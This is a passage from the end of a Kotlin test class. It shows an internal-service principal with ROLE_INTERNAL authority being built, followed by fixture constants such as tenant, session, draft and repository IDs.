            "internal-service",
            null,
            listOf(SimpleGrantedAuthority("ROLE_INTERNAL")),
        )
    }

    private companion object {
        private const val TENANT = 7L
        private const val WEB_SESSION = "web-0f2a"
        private const val NEW_ID = 55L
        private const val DRAFT_ID = 12L
        private const val LANDING_REPO_ID = 40L
        private const val REVIEWER = "reviewer"
    }
}
